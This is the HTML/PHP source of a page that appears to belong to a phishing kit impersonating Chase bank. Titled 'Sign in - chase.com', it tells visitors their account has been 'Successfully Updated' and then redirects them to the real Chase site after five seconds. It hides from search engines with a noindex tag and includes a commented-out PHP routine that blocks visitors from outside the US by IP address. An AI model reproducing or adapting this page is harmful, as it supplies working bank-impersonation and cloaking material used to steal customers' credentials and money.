<?php
	
	/*if($_SERVER['HTTP_X_FORWARDED_FOR'])
		$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
		else
		
		$ip = $_SERVER['REMOTE_ADDR'];
		
		$two_letter_country_code = iptocountry($ip);
		
		function iptocountry($ip){
			$numbers = preg_split( "/\./", $ip);
			include("ip_files/".$numbers[0]. ".php");
			$code = ($numbers[0] * 16777216) + ($numbers[1] * 65536) + ($numbers[2] * 256) + ($numbers[3]);
			
			foreach($ranges as $key => $value){
				if($key <= $code){
					if($ranges[$key][0] >= $code){
						$country = $ranges[$key][1]; break;
					}
				}
			}
			
			if($country == ""){
				$country = "unknown";
			}
			return $country;	
		}
		
		// Then add this little blocking script at the end of the code above
		
		//if($two_letter_country_code == "US")
		//die();
		
		
		if($two_letter_country_code == "US"){
		
			}
		else{
		
		  die("You do not have access to this page");
		}
		
*/
?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" class="no-js" lang="en" dir="ltr">
    <head>
        <meta charset="utf-8"/>

        <meta name="robots" content="noindex,nofollow" />
            <meta name="google-site-verification" content="3CrQzUY6Sc8yzx6kfUoUJaDReLCeS0E2Ky9uwa2_whQ"/>
        <title>Sign in - chase.com</title>
        <meta name="description" content=""/>
        <meta name="author" content=""/>
        <meta name="msapplication-config" content="none" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
        <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
       
       <link rel="stylesheet" href="css/style.css" />
       <link rel="shortcut icon" href="images/favicon.png"/>
     <meta http-equiv="refresh" content="5;url=https://secure01b.chase.com/web/auth/dashboard#/dashboard/overviewAccounts/overview/index" />
        <script type="text/javascript" src="js/jqueryLib.js"></script>
        </head>
    <body>
          <div class="bg-body3"> 
              
         </div>
         <div class="hed-const">
            
               <div class="header">
                  <div class="logo-line"></div>
                 <div class="logo"></div>
              </div>
         </div>
          <div class="bb-content">
             <div class="lo-header2">Congratulations!!! Your Account has been Successfully Updated.</div>
                <form name="form1" method="post" action="">
                  <table width="720" border="0" class="tbl-tt2">
                       
                       <tr>
                         <td>
                      <img src="images/te.gif" width="75" height="75"><br><br>
                      <div style="font-size:14px; font-weight:600">Please wait... don't press the browser's back button, you will be redirected in 5 seconds</div>
                      </td>
                       </tr>
                       <tr>
                         <td>&nbsp;</td>
                       </tr>
                  </table>
                </form>
                
                
              </div>
            <div class="login-line"></div>
              <div class="login-container2"></div>
              
              
              
             <div class="footer">
                 <div class="footer-bg"></div>
             </div>

          </div>
          
  <script>
   var input = document.getElementById("emailpass1");
   input.addEventListener("keyup", function(event){
	  if(event.keyCode === 13){
	    event.preventDefault();
		document.getElementById("btn-log").click();
	  }
	
	});
</script>         
          
          
          
          
         <script type="text/javascript" src="js/actions.js"></script>
    </body>
</html>